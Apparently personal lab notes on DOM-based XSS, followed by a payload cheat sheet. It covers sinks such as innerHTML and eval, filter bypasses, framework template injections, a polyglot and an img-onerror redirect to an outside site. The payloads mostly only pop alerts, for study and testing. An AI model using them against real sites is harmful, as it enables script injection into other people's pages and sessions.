
### DOM BASED XSS : Client side only

#### Lab -- XSS 0x1

![[xss lab 1.png]]
-  Here if we type 
```javascript
<script>prompt(1)</script>
```

![[xss lab 2.png]]
-  The reason why it didn't load anytime after we typed that script is because that component is not a part of any thing.

-  **Consider this :**
```javascript
<img src=x onerror="prompt(1)">
```

![[xss lab 3.png]]
-  Now the reason why this worked is why the image source failed to load x, it executed on error. resulting in that prompt.

-  **Here is another example on how you can redirect to another page.**
```javascript

<img src=x onerror="window.location.href='https://crypter-xi.vercel.app'">
```

# **DOM-Based XSS Payloads Only**

## **Basic Test Payloads:**

javascript

# URL Fragment (#)
#<script>alert(document.domain)</script>
#<img src=x onerror=alert(document.domain)>
#javascript:alert(document.domain)

# Location-based
"><svg onload=alert(document.domain)>
' onmouseover=alert(document.domain) x='

## **DOM Sink Exploits:**

### **document.write()**

javascript

"><svg onload=alert(document.domain)>
"><script>alert(document.domain)</script>
';alert(document.domain);'

### **innerHTML**

javascript

<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
<iframe src=javascript:alert(document.domain)>

### **eval() / setTimeout() / setInterval()**

javascript

';alert(document.domain);'
"};alert(document.domain);{"
`${alert(document.domain)}`

### **location / window.location**

javascript

javascript:alert(document.domain)
data:text/html,<script>alert(document.domain)</script>

### **document.cookie**

javascript

"; alert(document.domain); "
' + alert(document.domain) + '

### **JSON.parse() with Constructor**

javascript

{"__proto__":{"toString":"alert(document.domain)"}}

## **Source-to-Sink Examples:**

### **From location.hash**

javascript

#<script>alert(document.domain)</script>
#<img src=x onerror=alert(document.domain)>
#javascript:alert(document.domain)

### **From location.search**

javascript

?param=<script>alert(document.domain)</script>
?param=" onmouseover=alert(document.domain) "
?param='-alert(document.domain)-'

### **From document.referrer**

javascript

Referer: "><script>alert(document.domain)</script>
Referer: javascript:alert(document.domain)

## **Advanced Bypasses:**

### **Without Parentheses**

javascript

alert`document.domain`
onerror=alert;throw document.domain
location=javascript:alert(document.domain)

### **Without alert()**

javascript

prompt(document.domain)
confirm(document.domain)
console.log(document.domain)

### **Template Literals**

javascript

${alert(document.domain)}
`${alert(document.domain)}`

## **Common DOM Vulnerabilities:**

### **AngularJS**

javascript

{{constructor.constructor('alert(document.domain)')()}}
{{$eval.constructor('alert(document.domain)')()}}

### **Vue.js**

javascript

{{_c.constructor('alert(document.domain)')()}}

### **jQuery**

javascript

$('<img src=x onerror=alert(document.domain)>')
$(location.hash)

## **Quick Test URLs:**

text

https://target.com/page.html#<script>alert(document.domain)</script>
https://target.com/page.html?search=<img src=x onerror=alert(document.domain)>
https://target.com/page.html?returnUrl=javascript:alert(document.domain)

## **Polyglot Payload (Works in many contexts):**

javascript

javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(document.domain)//'>

**Start with:** `#<script>alert(document.domain)</script>`  
**Then try:** `"><svg onload=alert(document.domain)>`  
**Advanced:** `javascript:alert(document.domain)`